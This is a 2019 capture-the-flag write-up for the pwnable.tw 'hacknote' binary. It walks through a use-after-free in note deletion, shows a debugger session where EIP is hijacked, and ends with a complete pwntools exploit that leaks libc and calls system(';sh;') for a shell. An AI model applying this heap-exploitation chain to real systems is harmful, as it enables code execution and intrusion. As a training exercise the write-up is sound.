---
title: pwnable.tw hacknote writeup
date: "2019-10-12"
---

>A good Hacker should always take good notes!
>nc chall.pwnable.tw 10102

## Environment

```sh
$ uname -a
Linux base-debootstrap 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

Check binary security

```
pwndbg> checksec
[*] '/home/vagrant/work/pwnabletw/hacknote/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```


## Findings
First, I decompiled some functions using Ghidra.

### Main routine.
![](https://i.imgur.com/q0wbejm.png)

### AddNote function
![](https://i.imgur.com/X6ECv7i.png)
- malloc is called in units of 8 bytes(This chunk is managed by fastbins)

### DeleteNote
![](https://i.imgur.com/FIq6SBS.png)
- Calls the free() but does not store null pointer(Maybe can use Use After Free)

### PrintNote
![](https://i.imgur.com/jFJxRVK.png)
- Execute the value received from the heap as a function.
- In the printNote function, the function is called from the pointer of the note to be displayed + 4-byte value.
- The function called here is the function pointer "0x804862b" added by the AddNote function.
- Decompiled 0x804862b
![](https://i.imgur.com/5tATsl1.png)


## Managing notes
In hacknote, Notes are managed as follows.

```c
struct Note {
    void (putsNoteFn*)(int NotePointer); // offset + 0x0
    char *NoteContent; // offset + 0x4
}

void *NoteList;
```

Each note is linked to NotesList after memory is allocated with malloc(8).

## Bug
### Use After Free
DeleteNote function does not store Null pointer after free(), thus, it has Use After Free Bug.
Steps to Reproduce:
1. Add Note. Input: 1->4->AAA
2. Add Note. Input: 1->4->BBB
3. Delete Note. Input: 2->0
4. Add Note. Input: 1->4->CCC
5. Print Note. Input: 3->0

"CCC" is displayed even though the value of the 0th index should have been deleted.
This is because the reference to the heap still exists after deleting index 0 in step 3, and the value on the heap is overwritten in step 4 later.

#### Control EIP with UAF
1. AddNote

```
NoteList <- malloc(8)
NoteList[0]
Note {
  *putsFn_p()
  *content
}
```

2. Store function pointer

```
NoteList[0]
Note { // offset +0x0
  putsFn_p() = 0x804862b // offset +0x0
  content // offset + 0x4
}
```

3. Set content length to 0x10bytes

```
NoteList[0]
Note { // offset + 0x0
  putsFn_p() = 0x804862b // offset + 0x0
  content = malloc(0x10) // offset + 0x4
}
```

4. Add another 0x10byte note

```
NoteList[0]
Note { // offset + 0x0
  putsFn_p() = 0x804862b // offset + 0x0
  content = malloc(0x10) // offset + 0x4
}

NoteList[1]
Note { // offset + 0x0
  putsFn_p() = 0x804862b // offset + 0x0
  content = malloc(0x10) // offset + 0x4
}
```

5. Delete NoteList[0]

```
NoteList[0]
Note { // offset + 0x0
  fastbins[0][0] // offset + 0x0
  fastbins[1][0] // offset + 0x4
}

NoteList[1]
Note { // offset + 0x0
  putsFn_p() = 0x804862b // offset + 0x0
  content = malloc(0x10) // offset + 0x4
}
```

6. Delete NoteList[1]

```
NoteList[0]
Note { // offset + 0x0
  fastbins[0][0] // offset + 0x0
  fastbins[1][0] // offset + 0x4
}

NoteList[1]
Note { // offset + 0x0
  fastbins[0][1] // offset + 0x0
  fastbins[1][1] // offset + 0x4
}
```

7. Add Note command: 1 -> 8 -> CCCCDDD

```
NoteList[0]
Note { // offset + 0x0
  fastbins[0][0] // offset + 0x0
  fastbins[1][0] // offset + 0x4
}

NoteList[1]
Note { // offset + 0x0
  fastbins[0][1] // offset + 0x0
  fastbins[1][1] // offset + 0x4
}

NoteList[2]
Note { // offset + 0x0
  putsFn_p() = 0x804862b // offset + 0x0
  content = malloc(0x8) = reallocated fastbins[0][0] <= "CCCCDDD" // offset + 0x4
}
```

8. State
```
NoteList[0]
Note { // offset + 0x0
  0x43434343("CCCC") // offset + 0x0
  fastbins[1][0] // offset + 0x4
}

NoteList[1]
Note { // offset + 0x0
  fastbins[0][1] // offset + 0x0
  fastbins[1][1] // offset + 0x4
}

NoteList[2]
Note { // offset + 0x0
  putsFn_p() = 0x804862b // offset + 0x0
  content = malloc(0x8) = reallocated fastbins[0][0] <= "CCCCDDD" // offset + 0x4
}
```

11. Execute PrintNote: 3->0
```
NoteList[0]
Note { // offset + 0x0
  0x43434343("CCCC") // offset + 0x0
  fastbins[1][0] // offset + 0x4
}

call => 0x43434343 // Crash!!
```

#### Demo
Set EIP to 0x43434343.
Steps to Reproduce:
1. 1->16->AAAA
2. 1->16->BBBB
3. 2->0
4. 2->1
5. 1->8->CCCCDDD
6. 3->0

```sh
pwndbg> r
Starting program: /home/vagrant/work/pwnabletw/hacknote/hacknote
----------------------
       HackNote
----------------------
 1. Add note
 2. Delete note
 3. Print note
 4. Exit
----------------------
Your choice :1
Note size :16
Content :AAAA
Success !
----------------------
       HackNote
----------------------
 1. Add note
 2. Delete note
 3. Print note
 4. Exit
----------------------
Your choice :1
Note size :16
Content :BBBB
Success !
----------------------
       HackNote
----------------------
 1. Add note
 2. Delete note
 3. Print note
 4. Exit
----------------------
Your choice :2
Index :0
Success
----------------------
       HackNote
----------------------
 1. Add note
 2. Delete note
 3. Print note
 4. Exit
----------------------
Your choice :2
Index :1
Success
----------------------
       HackNote
----------------------
 1. Add note
 2. Delete note
 3. Print note
 4. Exit
----------------------
Your choice :1
Note size :8
Content :CCCCDDD
Success !
----------------------
       HackNote
----------------------
 1. Add note
 2. Delete note
 3. Print note
 4. Exit
----------------------
Your choice :3
Index :0

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────
*EAX  0x43434343 ('CCCC')
 EBX  0x0
 ECX  0x0
*EDX  0x804b008 ◂— 'CCCCDDD\n'
*EDI  0xf7fca000 ◂— 0x1b1db0
*ESI  0xf7fca000 ◂— 0x1b1db0
*EBP  0xffffd618 —▸ 0xffffd638 ◂— 0x0
*ESP  0xffffd5ec —▸ 0x804893f ◂— add    esp, 0x10
*EIP  0x43434343 ('CCCC')
─────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────
Invalid address 0x43434343

──────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0xffffd5ec —▸ 0x804893f ◂— add    esp, 0x10
01:0004│      0xffffd5f0 —▸ 0x804b008 ◂— 'CCCCDDD\n'
02:0008│      0xffffd5f4 —▸ 0xffffd608 ◂— 0xa30 /* '0\n' */
03:000c│      0xffffd5f8 ◂— 0x4
... ↓
05:0014│      0xffffd600 —▸ 0xffffd628 —▸ 0xffff0a33 ◂— 0x0
06:0018│      0xffffd604 ◂— 0x0
07:001c│      0xffffd608 ◂— 0xa30 /* '0\n' */
────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► f 0 43434343
   f 1  804893f
   f 2  8048a8a
   f 3 f7e30637 __libc_start_main+247
Program received signal SIGSEGV (fault address 0x43434343)
```

## Exploit
We get EIP control.
Next, execute the exploit.

Plan:
1. puts() the read@GOT function address
2. Leak libc base address by subtracting offset of read@GOT function address
3. Calculate libc base address + system()
4. Send system() address
5. Execute system()

If libc address leak is possible, there is no problem even if it is not read@GOT function.

Function offset.
```sh
$ nm -D libc_32.so.6 | grep system
- snip -
0003a940 W system
```

```sh
$ nm -D ./libc_32.so.6 | grep read
- snip -
000d41c0 W read
- snip -
```

## Writeup

```py
from pwn import *

context(os='linux', arch='i386')

HOST = 'chall.pwnable.tw'
PORT = 10102

PRINT_NOTE_FN = 0x804862b
LIBC_READ_OFFSET = 0xd41c0
LIBC_SYSTEM_OFFSET = 0x3a940

elf = ELF('./hacknote')

class Note:
    def __init__(self, conn):
        self.send = conn.send
        self.sendline = conn.sendline
        self.recv = conn.recv
        self.recvuntil = conn.recvuntil
        self.sendafter = conn.sendafter

    def add_note(self, size, data):
        self.sendafter(':', '1')
        self.sendafter(':', str(size))
        self.sendafter(':', data)

    def delete_note(self, note_id):
        self.sendafter(':', '2')
        self.sendafter(':', str(note_id))

    def print_note(self, note_id):
        self.sendafter(':', '3')
        self.sendafter(':', str(note_id))

if len(sys.argv) > 1 and sys.argv[1] == '-r':
    conn = remote(HOST, PORT)
else:
    conn = process(['./hacknote'])

log.info('Pwning start')
note = Note(conn)

# create 2 notes
note.add_note(16, "AAAA")
note.add_note(16, "BBBB")

# delete 2 notes
# UAF
note.delete_note(0)
note.delete_note(1)

# leak libc read address
# print_note(8, read_got_addr)
note.add_note(8, p32(PRINT_NOTE_FN) + p32(elf.got[b'read']))

# leak libc
note.print_note(0)
ret = u32(note.recv(4))

# calc system address
libc_base = ret - LIBC_READ_OFFSET
print("libc_base: ", hex(libc_base))
system_addr = libc_base + LIBC_SYSTEM_OFFSET
print("system: ", hex(system_addr))

# delete note
note.delete_note(2)

# system(";sh;")
note.add_note(8, p32(system_addr) + b';sh;')
note.print_note(0)

conn.interactive()
```